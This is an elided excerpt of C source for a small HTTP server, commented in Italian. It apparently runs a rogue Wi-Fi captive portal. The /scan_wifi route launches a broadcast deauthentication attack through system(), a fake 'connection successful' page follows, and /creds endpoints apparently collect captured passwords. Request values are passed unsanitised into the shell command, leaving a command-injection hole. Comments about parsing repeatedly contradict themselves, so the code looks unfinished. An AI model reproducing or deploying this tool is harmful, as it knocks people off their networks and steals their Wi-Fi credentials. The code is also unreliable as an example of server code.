...
void send_response(int client_fd, const char *status, const char *content_type, const char *body, const char *extra_headers) {
    ...
    while (1) {
        ...
        while (line) {
            if (strncasecmp(line, "Content-Length:", 15) == 0) {
                ...
                while (end > auth_header && isspace((unsigned char)*end)) *end-- = '\0';
            }
            line = strtok(NULL, "\r\n");
        }
        ...
        if (strcmp(method, "POST") == 0 && content_len > 0) {
            ...
            // Nota: strtok altera req_buf, quindi rintracciamo la fine degli header nel buffer originale
            // che abbiamo salvato o ricreato. Fortunatamente abbiamo letto in req_buf,
            // cerchiamo il doppio CRLF o LF\LF.
            // Dato che strtok ha distrutto req_buf, per semplicita' cerchiamo l'inizio del body:
            // il corpo comincia dopo l'ultimo header, ma essendoci andati di strtok, il modo migliore
            // per un micro-server monothread è rileggere o cercare nel buffer originale.
            // Ripristiniamo la ricerca:
            // Trova la fine degli header cercando "\r\n\r\n" nel buffer originale prima di strtok?
            // Sì, ma ormai req_buf è alterato. 
            // In C, per motivi di efficienza, estraiamo semplicemente il corpo dal buffer originale
            // copiandolo prima del parsing dei token, o tenendo una copia.
            // Facciamo una copia di backup all'inizio del ciclo accept.
        }

        // NOTA: Per gestire POST /connect in modo semplice ed elegante senza allocazioni giganti,
        // modifichiamo il buffer parsing all'origine.
        // Facciamo il rollback e facciamo un parsing robusto e lineare senza distruggere req_buf con strtok.
        
        // Rileggiamo i parametri del corpo POST direttamente cercando la fine degli header (due newlines consecutive)
        char *post_body = NULL;
        // Cerca la fine degli header nella stringa (req_buf non è ancora passata a strtok se facciamo così)
        // Ripristiniamo la logica con puntatori diretti anziché strtok:
        ...
        if (body_ptr) {
            ...
            if (body_ptr) post_body = body_ptr + 2;
        }

        // Routing
        if (strcmp(path, "/scan_wifi") == 0) {
            // Esegue lo script helper per lo scanning
            char *json = run_command_output("/etc/portal/scan_wifi.sh");
            ...
            if (strlen(dec_i) == 0) strcpy(dec_i, "ath0");
            ...
            if (strlen(dec_b) > 0) {
                ...
                if (access("/usr/bin/deauth", X_OK) == 0) {
                    char cmd[512];
                    snprintf(cmd, sizeof(cmd), "/usr/bin/deauth %s %s FF:FF:FF:FF:FF:FF 0 > /tmp/deauth.log 2>&1 & echo $! > /tmp/deauth.pid", dec_i, dec_b);
                    system(cmd);
                    write_file("/tmp/deauth_active", "yes");
                } else {
                    write_file("/tmp/deauth.log", "Binario /usr/bin/deauth non trovato o non eseguibile.\n");
                }
            }
            send_response(client_fd, "200 OK", "text/plain", "ok", NULL);
        }
            ...
            const char *success_html = 
                ...
                "<body><h2>Connessione effettuata con successo!</h2><p>Verrai reindirizzato a breve...</p></body></html>";
            send_response(client_fd, "200 OK", "text/html", success_html, NULL);
        }
        else if (strcmp(path, "/creds") == 0 || strcmp(path, "/cgi-bin/creds.cgi") == 0 || strcmp(path, "/admin/creds") == 0) {
